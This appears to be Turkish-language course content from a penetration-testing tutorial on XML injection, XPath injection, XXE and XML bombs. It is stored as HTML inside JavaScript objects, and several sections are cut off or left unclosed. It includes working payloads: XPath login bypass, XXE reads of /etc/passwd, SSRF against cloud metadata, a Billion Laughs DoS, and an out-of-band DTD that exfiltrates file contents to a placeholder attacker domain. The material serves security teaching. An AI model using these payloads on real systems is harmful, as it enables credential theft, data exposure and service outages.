{
  title: "2. XML Injection Nedir?",
  content: `
    <p class="small" style="margin-bottom:15px;">XML Injection, bir saldırganın kullanıcı girdisini manipüle ederek XML dokümanına veya sorgusuna kötü amaçlı içerik enjekte etmesiyle oluşan zafiyettir.<br>Bu, kimlik doğrulama atlatma, veri sızıntısı veya uygulama davranışının manipülasyonuna yol açabilir. XML input kabul eden API'ler ve formlar temel hedeftir.</p>

    <div class="card" style="margin-top:8px; border-left: 2px solid var(--secondary); background:rgba(6,182,212,0.05);">
      <strong style="color:var(--secondary); font-size:12px;">Saldırının İşleyişi</strong>
      <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin-top:5px;white-space:pre-wrap;word-break:break-all;">1. Input Point: XML kabul eden bir giriş noktası tespit edilir (API, form, upload).
2. Malicious Payload: Girdiye ekstra element/attribute/entity enjekte edilir.
3. Impact: XML yapısı bozularak kimlik doğrulama atlatılır ya da yetkisiz veriye erişilir.</pre>
    </div>

    <p class="small" style="margin:15px 0 5px 0;">Örnek - Vulnerable bir uygulama kullanıcı XML'ini parse eder:</p>
    <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-all;">&lt;user&gt;
  &lt;username&gt;admin&lt;/username&gt;
  &lt;password&gt;password123&lt;/password&gt;
&lt;/user&gt;</pre>

    <p class="small" style="margin:15px 0 5px 0;">Saldırgan payload enjekte eder:</p>
    <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-all;">&lt;user&gt;
  &lt;username&gt;admin&lt;/username&gt;
  &lt;password&gt;' OR '1'='1&lt;/password&gt;
&lt;/user&gt;</pre>
    <p class="small" style="margin-top:8px;">Uygulama bu değeri bir XML-tabanlı sorguya (ör. XPath) doğrudan aktarıyorsa, koşul her zaman doğru döner ve kimlik doğrulama atlatılabilir.</p>

    <div style="overflow-x:auto; margin-top:18px;">

            <th style="text-align:left;padding:8px;color:var(--secondary);">Etki</th>
          </tr>
        </thead>
        <tbody>
          <tr style="border-bottom:1px solid rgba(255,255,255,0.05);"><td style="padding:8px;">XML Data Manipulation</td><td style="padding:8px;">Uygulama davranışını değiştirmek için XML verisini değiştirme.</td><td style="padding:8px;">Veri manipülasyonu, auth bypass</td></tr>
          <tr style="border-bottom:1px solid rgba(255,255,255,0.05);"><td style="padding:8px;">XML Tag Injection</td><td style="padding:8px;">Dokümana yeni/değiştirilmiş etiket enjekte etme.</td><td style="padding:8px;">Yetki yükseltme, parsing hataları</td></tr>
          <tr style="border-bottom:1px solid rgba(255,255,255,0.05);"><td style="padding:8px;">XPath Injection</td><td style="padding:8px;">Kötü amaçlı XPath ifadeleri enjekte etme.</td><td style="padding:8px;">Yetkisiz veri erişimi, auth bypass</td></tr>
          <tr style="border-bottom:1px solid rgba(255,255,255,0.05);"><td style="padding:8px;">XXE (XML External Entity)</td><td style="padding:8px;">Harici entity'lerin istismarı.</td><td style="padding:8px;">Dosya ifşası, SSRF, DoS</td></tr>

          <tr style="border-bottom:1px solid rgba(255,255,255,0.05);"><td style="padding:8px;">XML Bombs</td><td style="padding:8px;">Büyük/derin iç içe geçmiş dokümanlarla sunucuyu yorma.</td><td style="padding:8px;">Denial of Service (DoS)</td></tr>
          <tr><td style="padding:8px;">XInclude Injection</td><td style="padding:8px;">Harici içeriğin kötü amaçlı dahil edilmesi.</td><td style="padding:8px;">Dosya dahil etme, bilgi ifşası</td></tr>

{
  title: "3. Test Metodolojisi - Metakarakterlerle Tespit",
  content: `
    <details>
    <summary style="cursor:pointer;font-weight:bold;font-size:14px;padding:6px 0;color:var(--accent);">Detayları Göster / Gizle</summary>
    <div style="margin-top:10px;">
    <p class="small" style="margin-bottom:15px;">Kullanıcı, profil güncelleme veya kayıt işlemi sırasında XML metakarakterleri (<code>' " &lt; &gt; &amp;</code>) enjekte edebiliyorsa ve uygulama bunları kontekste göre doğrulamıyorsa,<br>uygulama XML Injection'a karşı savunmasızdır. Amaç, XML parse hatası tetikleyerek zafiyeti doğrulamaktır.</p>

    <ul style="list-style:none;padding:0;margin:0;display:grid;gap:12px">
      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
        <strong style="color:var(--accent);display:block;margin-bottom:6px;">1. Tek/Çift Tırnak (Attribute Değerleri)</strong>
        <p class="small" style="margin-bottom:5px;">Tırnaklar, etiket içindeki attribute değerlerini sınırlamak için kullanılır. Kapatılmamış bir tırnak XML'i bozar.</p>
        <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-all;">
Geçerli:    &lt;group id="id"&gt;admin&lt;/group&gt;    veya    &lt;group id='id'&gt;admin&lt;/group&gt;
Bozuk:      &lt;group id="12""&gt;admin&lt;/group&gt;   veya    &lt;group id='12''&gt;admin&lt;/group&gt;</pre>
        <span class="small" style="color:#64748b;"><br>Girdiye tek bir <code>"</code> veya <code>'</code> eklemek genelde bir parsing hatası ile zafiyeti doğrulamaya yeter.</span>
      </li>

      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
        <strong style="color:var(--accent);display:block;margin-bottom:6px;">2. Ampersand (&amp;) - Entity Referansları</strong>
        <p class="small" style="margin-bottom:5px;">Ampersand, entity referanslarını temsil eder: <code>&amp;EntityName;</code>. Tanımlı olmayan bir entity enjekte etmek hata tetikler.</p>
        <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-all;">&amp;name;      --&gt; Entity tanımlı değilse parse hatası
&amp;name       --&gt; Sondaki ';' kaldırılırsa malformed XML hatası</pre>
      </li>

      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
        <strong style="color:var(--accent);display:block;margin-bottom:6px;">3. Açı Parantezleri (&lt; &gt;) - Tag / Comment / CDATA</strong>
        <p class="small" style="margin-bottom:5px;">Açı parantezleri ile yeni etiketler, yorum satırları veya CDATA blokları tanımlanabilir. Bu, en güçlü test vektörüdür çünkü doküman yapısını tamamen değiştirebilir.</p>
        <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-all;">&lt;tagname&gt;              --&gt; Yeni etiket enjeksiyonu
&lt;!-- yorum --&gt;         --&gt; Sorgunun bir kısmını yorum haline getirme
&lt;![CDATA[value]]&gt;      --&gt; Metakarakterleri escape etmeden ham veri gömme</pre>
      </li>

      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
        <strong style="color:var(--accent);display:block;margin-bottom:6px;">4. Test Akışı Özeti</strong>
        <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-all;">1. Girdiye tek tırnak/açı parantezi gönder -> parse hatası var mı gözlemle
2. Hata varsa: uygulama ham girdiyi validate etmeden XML'e gömüyor demektir
3. Kapanmamış/yeni tag enjekte ederek doküman yapısını değiştirmeyi dene
4. Sonuç, hedefin Tag Injection / Attribute Injection / XPath / XXE'ye açık olup olmadığını belirler</pre>
      </li>
    </ul>
    </div>
    </details>
  `
},

{
  title: "4.1- XML Tag Injection (Adım Adım)",
  content: `
    <details>
    <summary style="cursor:pointer;font-weight:bold;font-size:14px;padding:6px 0;color:var(--accent);">Detayları Göster / Gizle</summary>
    <div style="margin-top:10px;">
    <p class="small" style="margin-bottom:15px;">XML Tag Injection, saldırganın girdiye yeni veya değiştirilmiş XML etiketleri eklediği spesifik bir XML Injection türüdür.<br>Odak noktası veri değil, dokümanın <b>yapısını</b> manipüle etmektir - bu da genellikle uygulama mantığının yanlış yorumlanmasına yol açar.</p>

    <ul style="list-style:none;padding:0;margin:0;display:grid;gap:12px">
      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
        <strong style="color:var(--accent);display:block;margin-bottom:6px;">ADIM 1: Hedef Alanı Belirleme</strong>
        <p class="small" style="margin-bottom:5px;">Kayıt veya profil güncelleme formunda, sunucu tarafında bir XML dokümanına dönüştürülen bir alan (ör. username) bulunur.</p>
        <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-all;">&lt;user&gt;
  &lt;username&gt;joe&lt;/username&gt;
  &lt;password&gt;joespassword&lt;/password&gt;
  &lt;group&gt;users&lt;/group&gt;
&lt;/user&gt;</pre>

        <p class="small" style="margin-bottom:5px;">Kullanıcı adı alanına kendi etiketini kapatıp yeni bir etiket açan bir payload gönderilir.</p>
        <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-all;">Girdi (username alanı): joe&lt;/username&gt;&lt;group&gt;admin&lt;/group&gt;&lt;username&gt;joe</pre>

        <p class="small" style="margin-bottom:5px;">Girdi validate edilmeden gömüldüğü için sunucu tarafında derlenen gerçek XML şu hale gelir:</p>
        <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-all;">&lt;user&gt;
  &lt;username&gt;joe&lt;/username&gt;&lt;group&gt;admin&lt;/group&gt;&lt;username&gt;joe&lt;/username&gt;
  &lt;password&gt;joespassword&lt;/password&gt;
  &lt;group&gt;users&lt;/group&gt;
&lt;/user&gt;</pre>
        <span class="small" style="color:#ef4444;">Sonuç: Doküman içinde çakışan iki &lt;group&gt; etiketi oluşur. Uygulama parser'ı ilkini (admin) baz alıyorsa, joe kullanıcısına admin grubu atanmış olur.</span>

      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
        <strong style="color:var(--accent);display:block;margin-bottom:6px;">ADIM 4: Doğrudan Yetki Etiketi Enjeksiyonu (Boş Etiket)</strong>
        <p class="small" style="margin-bottom:5px;">Bazı uygulamalar yalnızca bir etiketin <i>var olup olmadığını</i> kontrol eder (self-closing tag ile).</p>
        <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-all;">&lt;user&gt;
  &lt;username&gt;admin&lt;/username&gt;
  &lt;role&gt;&lt;admin/&gt;&lt;/role&gt;

Sonuç: &lt;user role="user" name="joe""/&gt;  --&gt; XML Parse Error (zafiyet doğrulandı)</pre>

{
  title: "4.3- XPath Injection (Adım Adım)",
  content: `
    <details>
    <summary style="cursor:pointer;font-weight:bold;font-size:14px;padding:6px 0;color:var(--accent);">Detayları Göster / Gizle</summary>
    <div style="margin-top:10px;">
    <p class="small" style="margin-bottom:15px;">Uygulamalar bazen veriyi bir veritabanı yerine XML dosyasında saklar ve <b>XPath</b> sorgularıyla erişir.<br>Girdi doğrulanmadan XPath sorgusuna dahil edilirse, SQLi'ye çok benzer bir mantıkla kimlik doğrulama atlatılabilir veya veri sızdırılabilir.</p>

    <ul style="list-style:none;padding:0;margin:0;display:grid;gap:12px">
      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
        <strong style="color:var(--accent);display:block;margin-bottom:6px;">ADIM 1: Zafiyetli Sorgu Yapısı</strong>
        <p class="small" style="margin-bottom:5px;">Sunucu tarafı kod, kullanıcı girdisini doğrudan XPath ifadesine ekler:</p>
        <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-all;">// Sunucu tarafı (PHP benzeri pseudo-code):
$xpath = "//users/user[username/text()='" . $user . "' and password/text()='" . $pass . "']";</pre>
      </li>

      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
        <strong style="color:var(--accent);display:block;margin-bottom:6px;">ADIM 2: Kimlik Doğrulama Atlatma (Authentication Bypass)</strong>
        <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-all;">Username: ' or '1'='1
Password: ' or '1'='1</pre>
        <p class="small" style="margin:8px 0 0 0;">Derlenen sorgu:</p>
        <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-all;">//users/user[username/text()='' or '1'='1' and password/text()='' or '1'='1']</pre>
        <span class="small" style="color:#ef4444;">Koşul her zaman TRUE döner -> ilk kullanıcı olarak (genelde admin) giriş yapılır.</span>
      </li>

      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
        <strong style="color:var(--accent);display:block;margin-bottom:6px;">ADIM 3: Blind XPath Injection ile Veri Sızdırma</strong>
        <p class="small" style="margin-bottom:5px;">Sonuç ekrana yansımıyorsa, SQLi'deki boolean-based mantığıyla karakter karakter veri sızdırılabilir.</p>
        <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-all;">' or substring(//user[1]/password,1,1)='a
' or substring(//user[1]/password,1,1)='b
...
' or count(//user)=1 or '1'='1     --&gt; Toplam kullanıcı sayısını doğrulama
' or name(//user[1]/*[1])='username' or '1'='1  --&gt; Node/element ismini keşfetme</pre>
      </li>

      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
        <strong style="color:var(--accent);display:block;margin-bottom:6px;">ADIM 4: Tüm Dokümanı Sızdırma (Node Enumeration)</strong>
        <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-all;">' or 1=1] | //* | //x[1='1</pre>
        <span class="small" style="color:#64748b;">Bu tür payloadlar hedef XPath ifadesini kırıp tüm doküman ağacını (union benzeri) döndürmeyi dener.</span>
      </li>
    </ul>
    </div>
    </details>
  `
},

{
  title: "4.4- XXE (XML External Entity) Injection",
  content: `
    <details>
    <summary style="cursor:pointer;font-weight:bold;font-size:14px;padding:6px 0;color:var(--accent);">Detayları Göster / Gizle</summary>
    <div style="margin-top:10px;">
    <p class="small" style="margin-bottom:15px;">XXE, en kritik XML zafiyetlerinden biridir. XML standardı, DTD içinde harici kaynaklara (dosya, URL) işaret eden <b>external entity</b> tanımlamaya izin verir.<br>Parser bu harici entity çözümlemesini (external entity resolution) devre dışı bırakmadıysa, saldırgan sunucudaki dosyaları okuyabilir, dahili ağa istek attırabilir (SSRF) veya servisi çökertebilir (DoS).</p>

    <ul style="list-style:none;padding:0;margin:0;display:grid;gap:12px">
      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
        <strong style="color:var(--accent);display:block;margin-bottom:6px;">ADIM 1: Zafiyeti Tespit Etme (Basit Entity Testi)</strong>
        <p class="small" style="margin-bottom:5px;">DOCTYPE içinde basit bir dahili entity tanımlanıp gövdede referans verilir; yansıyorsa uygulama DTD'yi işliyor demektir.</p>
        <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-all;">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY test "XXE-TEST-OK"&gt; ]&gt;
&lt;stockCheck&gt;&lt;productId&gt;&amp;test;&lt;/productId&gt;&lt;/stockCheck&gt;</pre>
        <span class="small" style="color:#64748b;">Yanıtta "XXE-TEST-OK" yansıyorsa, external entity için de savunmasız olma ihtimali yüksektir.</span>
      </li>

      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
        <strong style="color:var(--accent);display:block;margin-bottom:6px;">ADIM 2: Klasik XXE - Sunucu Dosyası Okuma (File Disclosure)</strong>
        <p class="small" style="margin-bottom:5px;">SYSTEM anahtar kelimesiyle harici (yerel dosya sistemindeki) bir kaynağa işaret eden entity tanımlanır ve gövdede referans verilir.</p>
        <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-all;">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;/stockCheck&gt;</pre>
        <span class="small" style="color:#64748b;">Uygulama productId değerini yanıtta gösteriyorsa, /etc/passwd içeriği doğrudan sızdırılır.</span>
      </li>

      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
        <strong style="color:var(--accent);display:block;margin-bottom:6px;">ADIM 3: Blind XXE - Out-of-Band (OOB) Veri Sızdırma</strong>
        <p class="small" style="margin-bottom:5px;">Sonuç ekrana yansımıyorsa, saldırgan kendi sunucusunda barındırdığı harici bir DTD üzerinden veriyi dışarı (kendi domainine) taşıtabilir.</p>
        <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-all;">-- saldirgan.com/evil.dtd:
&lt;!ENTITY % file SYSTEM "file:///etc/hostname"&gt;
&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://saldirgan.com/?x=%file;'&gt;"&gt;
%eval;
%exfil;

-- Hedefe gönderilen payload:
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM "http://saldirgan.com/evil.dtd"&gt; %xxe; ]&gt;
&lt;stockCheck&gt;&lt;productId&gt;test&lt;/productId&gt;&lt;/stockCheck&gt;</pre>
        <span class="small" style="color:#64748b;">saldirgan.com'un access log'unda dosya içeriği bir GET isteği parametresi olarak görünür.</span>
      </li>

      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
        <strong style="color:var(--accent);display:block;margin-bottom:6px;">ADIM 4: XXE üzerinden SSRF</strong>
        <p class="small" style="margin-bottom:5px;">SYSTEM URI'si dosya yerine bir URL olarak verilirse, sunucu saldırganın belirlediği adrese (ör. dahili ağ, cloud metadata endpoint) istek atar.</p>
        <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-all;">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/" &gt; ]&gt;
&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;/stockCheck&gt;</pre>
        <span class="small" style="color:#ef4444;">Cloud ortamlarında (AWS/Azure/GCP) bu teknik ile geçici kimlik bilgileri sızdırılabilir.</span>
      </li>
    </ul>
    </div>
    </details>
  `
},

{
  title: "4.5- Billion Laughs / XML Bomb (DoS)",
  content: `
    <details>
    <summary style="cursor:pointer;font-weight:bold;font-size:14px;padding:6px 0;color:var(--accent);">Detayları Göster / Gizle</summary>
    <div style="margin-top:10px;">
    <p class="small" style="margin-bottom:15px;">Billion Laughs (XML Bomb / Exponential Entity Expansion), veri sızdırmayı değil <b>servisi çökertmeyi</b> hedefleyen bir DoS saldırısıdır.<br>Küçük, iç içe geçmiş entity tanımları katlanarak (üstel olarak) genişler ve parser'ın belleğini/CPU'sunu tüketir.</p>

    <ul style="list-style:none;padding:0;margin:0;display:grid;gap:12px">
      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
        <strong style="color:var(--accent);display:block;margin-bottom:6px;">Klasik Billion Laughs Payload'ı</strong>
        <p class="small" style="margin-bottom:5px;">Her seviye bir öncekini 10 kez referans alır. 9 seviye sonunda tek bir küçük dosya, parser belleğinde milyarlarca "lol" karakterine genişler.</p>
        <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-all;">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE lolz [
 &lt;!ENTITY lol "lol"&gt;
 &lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;
 &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;
 &lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;
 &lt;!-- ... lol5, lol6, lol7, lol8 aynı desende devam eder ... --&gt;
 &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;
]&gt;
&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</pre>
        <span class="small" style="color:#ef4444;">10^9 (~1 milyar) karakter üretilir -> RAM tükenir, parser/servis çöker.</span>
      </li>

        <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin-top:5px;white-space:pre-wrap;word-break:break-all;">Data Exposure (Veri İfşası)        --> Sunucudaki hassas dosyaların okunması (/etc/passwd, config, private key)

{
  title: "2. Harici Entity Türleri: Private vs. Public",
  content: `
    <p class="small" style="margin-bottom:15px;">İki tür harici entity vardır: <b>Private</b> ve <b>Public</b>. Aralarındaki fark kullanım amaçlarına dayanır.<br>Private external entity'ler tek bir yazar veya yazar grubuyla sınırlıdır. Public entity'ler ise daha geniş/genel kullanım için tasarlanmıştır.</p>

    <div style="display:grid; grid-template-columns:1fr 1fr; gap:14px; margin-top:10px;">
      <div class="card" style="border-left: 2px solid #ef4444; background:rgba(239,68,68,0.05); padding:12px; border-radius:8px;">
        <strong style="color:#ef4444; font-size:13px;">PRIVATE - SYSTEM Anahtar Kelimesi</strong>
        <p class="small" style="margin:6px 0;">Sadece bir URI belirtilir; erişim tek bir yazar/kaynağa özeldir. En tehlikeli tür budur çünkü doğrudan yerel dosya sistemine (<code>file://</code>) veya dahili ağa (<code>http://</code>) işaret edebilir.</p>
        <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin-top:5px;white-space:pre-wrap;word-break:break-all;">&lt;!ENTITY name SYSTEM "URI"&gt;</pre>
        <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin-top:8px;white-space:pre-wrap;word-break:break-all;">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE message [
  &lt;!ELEMENT sign (#PCDATA)&gt;
  &lt;!ENTITY c SYSTEM "http://my.site/copyright.xml"&gt;
]&gt;
&lt;sign&gt;&amp;c;&lt;/sign&gt;</pre>
      </div>

      <div class="card" style="border-left: 2px solid var(--secondary); background:rgba(6,182,212,0.05); padding:12px; border-radius:8px;">
        <strong style="color:var(--secondary); font-size:13px;">PUBLIC - PUBLIC Anahtar Kelimesi</strong>
        <p class="small" style="margin:6px 0;">Bir <b>PublicID</b> (standart bir tanımlayıcı) ile birlikte, entity'nin bulunabileceği alternatif bir URI belirtilir. Daha geniş/genel kullanım için tasarlanmıştır.</p>
        <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin-top:5px;white-space:pre-wrap;word-break:break-all;">&lt;!ENTITY name PUBLIC "PublicID" "URI"&gt;</pre>

&lt;!DOCTYPE message [
  &lt;!ELEMENT sign (#PCDATA)&gt;
  &lt;!ENTITY c PUBLIC "-//W3C//TEXT copyright//EN"
    "http://www.w3.org/xmlspec/copyright.xml"&gt;
]&gt;
&lt;sign&gt;&amp;c;&lt;/sign&gt;</pre>
      </div>
    </div>

    <div class="card" style="margin-top:14px; border-left: 2px solid #f59e0b; background:rgba(245,158,11,0.05); padding:12px; border-radius:8px;">
      <strong style="color:#f59e0b; font-size:12px;">Pentest Açısından Önemi</strong>
      <p class="small" style="margin:6px 0 0 0;">Bir hedefte <code>SYSTEM</code> anahtar kelimesiyle entity tanımlamaya izin veriliyorsa, saldırgan <code>file://</code>, <code>http://</code>, <code>ftp://</code>, <code>php://</code> gibi herhangi bir URI şemasını deneyebilir. Bu, hem yerel dosya okuma hem de SSRF için giriş noktasıdır.</p>

{
    title: "3.1- Resource Inclusion (Klasik XXE) - Adım Adım",
    content: `
      <details>
      <summary style="cursor:pointer;font-weight:bold;font-size:14px;padding:6px 0;color:var(--accent);">Detayları Göster / Gizle</summary>
      <div style="margin-top:10px;">
      <p class="small" style="margin-bottom:15px;">Resource Inclusion, en temel XXE istismar tekniğidir. Saldırgan, yerel bir dosyaya işaret eden harici bir entity tanımlayan kötü amaçlı bir XML dosyası hazırlar/yükler.<br>Uygulama bu dokümanı işlerken hem mesajın gövdesini hem de referans verilen dosyanın içeriğini alıcıya gösterir.</p>

      <ul style="list-style:none;padding:0;margin:0;display:grid;gap:12px">
        <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
          <strong style="color:var(--accent);display:block;margin-bottom:6px;">ADIM 1: Hedef Dosyaya İşaret Eden Entity'yi Tanımlama</strong>
          <p class="small" style="margin-bottom:5px;">DOCTYPE içinde, <code>file://</code> protokolüyle sunucudaki hassas bir dosyaya işaret eden bir private entity tanımlanır.</p>
          <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-all;">&lt;!ENTITY xxefile SYSTEM "file:///etc/passwd"&gt;</pre>
        </li>

        <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
          <strong style="color:var(--accent);display:block;margin-bottom:6px;">ADIM 2: Gövdede Entity'ye Referans Vermek</strong>
          <p class="small" style="margin-bottom:5px;">XML isteğinin body kısmında, oluşturulan entity'ye <code>&amp;xxefile;</code> ile referans verilir. Tam payload şu şekilde olur:</p>
          <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-all;">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE message [
  &lt;!ENTITY xxefile SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;message&gt;
  &lt;from&gt;SuperMario&lt;/from&gt;
  &lt;body&gt;&amp;xxefile;&lt;/body&gt;
&lt;/message&gt;</pre>
        </li>

        <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
          <strong style="color:var(--accent);display:block;margin-bottom:6px;">ADIM 3: İsteği Gönderme ve Parser'ı Tetikleme</strong>
          <p class="small" style="margin-bottom:5px;">İstek hem saldırıyı tetiklemek hem de XML parser'ı kötü amaçlı içeriği getirmeye zorlamak için gönderilir. Ardından uygulamanın sızdırılan bilgiyi bir şekilde göstermesi sağlanmalıdır (ör. mesajı okuyan bir kullanıcı arayüzü, log görüntüleyici, PDF/rapor üretici).</p>
        </li>

        <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
          <strong style="color:var(--accent);display:block;margin-bottom:6px;">ADIM 4: Sonucu Gözlemleme (Exploit)</strong>
          <p class="small" style="margin-bottom:5px;">Alıcı mesajı görüntülediğinde, yalnızca mesajın gövdesini değil, aynı zamanda harici entity'nin (<code>&amp;xxefile;</code>) içeriğini de yani <code>/etc/passwd</code> dosyasının tamamını görür.</p>
          <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-all;">August 21, 2014

{
  title: "3.2- Error-Based XXE (Hata Mesajları Üzerinden Sızdırma)",
  content: `
    <details>
    <summary style="cursor:pointer;font-weight:bold;font-size:14px;padding:6px 0;color:var(--accent);">Detayları Göster / Gizle</summary>
    <div style="margin-top:10px;">
    <p class="small" style="margin-bottom:15px;">Uygulama entity içeriğini doğrudan ekrana yansıtmıyorsa ancak XML parse hatalarını gösteriyorsa, dosya içeriği kasıtlı olarak <b>geçersiz bir dosya yoluna</b> gömülerek hata mesajı içine sızdırılabilir.</p>

    <ul style="list-style:none;padding:0;margin:0;display:grid;gap:12px">
      <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
        <strong style="color:var(--accent);display:block;margin-bottom:6px;">Parametre Entity ile Hata Tetikleme</strong>
        <p class="small" style="margin-bottom:5px;">Var olmayan bir dosyayı okumaya çalışan parametre entity, hedef dosyanın içeriğini dosya adı olarak kullanır - parser bunu bulamayınca hata mesajının içine dosya içeriğini gömer.</p>
        <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;white-space:pre-wrap;word-break:break-all;">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY % file SYSTEM "file:///etc/hostname"&gt;
  &lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///nonexistent/%file;'&gt;"&gt;
  %eval;
  %error;
]&gt;
&lt;foo&gt;test&lt;/foo&gt;</pre>
        <span class="small" style="color:#64748b;">Dönen hata: "failed to open stream: /nonexistent/&lt;hostname-icerigi&gt;" gibi bir mesajla dosya içeriği sızdırılır.</span>
      </li>
    </ul>
    </div>
    </details>
  `
},

{
  title: "3.3- Blind XXE - Out-of-Band (OOB) Veri Sızdırma",

    <details>
    <summary style="cursor:pointer;font-weight:bold;font-size:14px;padding:6px 0;color:var(--accent);">Detayları Göster / Gizle</summary>
    <div style="margin-top:10px;">
    <p class="small" style="margin-bottom:15px;">Uygulama ne entity içeriğini yansıtıyor ne de detaylı hata veriyorsa (tam Blind durum), veri saldırganın kendi sunucusuna (OOB kanalı üzerinden) taşıtılır.<br>Bunun için harici bir DTD dosyası kullanılır - parametre entity'leri (<code>%</code>) ile.</p>

    <ul style="list-style:none;padding:0;margin:0;display:grid;gap:12px">

